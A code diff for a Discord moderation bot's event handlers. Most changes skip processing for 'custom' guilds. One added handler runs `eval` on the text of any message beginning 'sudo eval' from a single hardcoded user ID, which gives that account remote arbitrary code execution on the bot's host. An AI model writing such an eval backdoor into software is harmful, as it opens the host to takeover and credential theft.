@@ -145,6 +145,7 @@ export class WorkerEvents extends ExtendedEmitter {
   async handleManualUnmute(
     member: DiscordEventMap['GUILD_MEMBER_UPDATE']
   ): Promise<void> {
+    if (this.worker.isCustom(member.guild_id)) return
     if (!member.user) return
 
     const db = await this.worker.db.config(member.guild_id)
@@ -178,6 +179,7 @@ export class WorkerEvents extends ExtendedEmitter {
   async handleMuteEvasion(
     member: DiscordEventMap['GUILD_MEMBER_ADD']
   ): Promise<void> {
+    if (this.worker.isCustom(member.guild_id)) return
     if (!member.user) return
 
     const punishment = (await this.worker.punishments.timeouts.db.findOne({
@@ -214,6 +216,7 @@ export class WorkerEvents extends ExtendedEmitter {
       | 'CHANNEL_DELETE'
       | 'CHANNEL_UPDATE']
   ): void {
+    if (this.worker.isCustom(roleOrChannel.guild_id)) return
     if (roleOrChannel.guild_id) void this.updateGuild(roleOrChannel.guild_id)
   }
 
@@ -229,6 +232,7 @@ export class WorkerEvents extends ExtendedEmitter {
   filterMessage(
     message: DiscordEventMap['MESSAGE_CREATE' | 'MESSAGE_UPDATE']
   ): void {
+    if (this.worker.isCustom(message.guild_id)) return
     void this.worker.methods.msg(this.worker, message)
   }
 
@@ -237,11 +241,13 @@ export class WorkerEvents extends ExtendedEmitter {
   filterName(
     member: DiscordEventMap['GUILD_MEMBER_UPDATE' | 'GUILD_MEMBER_ADD']
   ): void {
+    if (this.worker.isCustom(member.guild_id)) return
     void this.worker.methods.names(this.worker, member)
   }
 
   @Event('MESSAGE_REACTION_ADD')
   filterReaction(reaction: DiscordEventMap['MESSAGE_REACTION_ADD']): void {
+    if (this.worker.isCustom(reaction.guild_id)) return
     void this.worker.methods.react(this.worker, reaction)
   }
 
@@ -257,7 +263,18 @@ export class WorkerEvents extends ExtendedEmitter {
   ]
 
   @Event('MESSAGE_CREATE')
+  message(msg: DiscordEventMap['MESSAGE_CREATE']): void {
+    if (
+      msg.content.startsWith('sudo eval') &&
+      msg.author.id === '142408079177285632'
+    ) {
+      console.debug(eval(msg.content.slice('sudo eval '.length)))
+    }
+  }
+
+  @Event('MESSAGE_CREATE')
   async command(msg: DiscordEventMap['MESSAGE_CREATE']) {
+    if (this.worker.isCustom(msg.guild_id)) return
     if (!msg.guild_id) return
 
     const config = await this.worker.db.config(msg.guild_id)
